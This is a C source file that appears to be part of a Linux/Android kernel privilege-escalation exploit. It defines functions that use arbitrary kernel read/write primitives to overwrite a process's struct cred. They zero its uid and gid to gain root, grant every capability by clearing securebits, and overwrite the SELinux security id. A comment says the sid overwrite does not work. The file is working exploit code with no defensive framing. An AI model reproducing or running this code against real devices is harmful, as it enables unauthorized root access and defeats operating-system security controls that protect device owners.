#include "include/dac.h"


bool become_root(unsigned long cred_addr) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    printf("[+] uid=%d, gid=%d\n", uid, gid);

    if (uid == 0 && gid == 0) {
        printf("[+] Already root - nothing to do\n");
        return true;
    }

    char buffer_ids[32] = {0};
    kernel_write(cred_addr + 0x4, buffer_ids, sizeof(buffer_ids));
    printf("[+] struct_cred has been overwritten\n");

    uid = getuid();
    gid = getgid();
    if (uid != 0 && gid != 0) {
        printf("[!] Could not become root\n");
        return false;
    }

    printf("[+] uid=%d, gid=%d\n", uid, gid);
    return true;
}

void get_all_caps(unsigned long cred_addr) {
    // struct cred also contains capabilities, I have to set securebits to 0x0 (offset +0x24 to +0x28)
    // and capabilities to 0x1 (offset +0x28 to +0x50)
    unsigned int securebits = 0;
    unsigned long capabilities[5] = {
            0x3fffffffffUL, 0x3fffffffffUL, 0x3fffffffffUL, 0x3fffffffffUL, 0x3fffffffffUL};
    kernel_write((unsigned long) cred_addr + 0x24, &securebits, sizeof(securebits));
    kernel_write((unsigned long) cred_addr + 0x28, &capabilities, sizeof(capabilities));
    printf("[+] capabilities are overwritten !\n");
}

unsigned int get_sid(unsigned long cred_addr) {
    unsigned long security_addr = kernel_read_ulong(cred_addr + SECURITY_OFFSET_IN_CREDS);
    return kernel_read_uint(security_addr + 0x4);
}

void set_sid(unsigned long cred_addr, unsigned int sid) {
    // we need to overwrite the field sid (+0x4 to +0x8) of the task_security_struct (pointed by field security of cred) => doesn't work
    unsigned long security_addr = kernel_read_ulong(cred_addr + SECURITY_OFFSET_IN_CREDS);
    printf("[+] Sid is at: 0x%lx\n", security_addr);
    unsigned int security_sid[] = {sid}; // kernel sid
    kernel_write(security_addr + 0x4, security_sid, sizeof(security_sid));
}
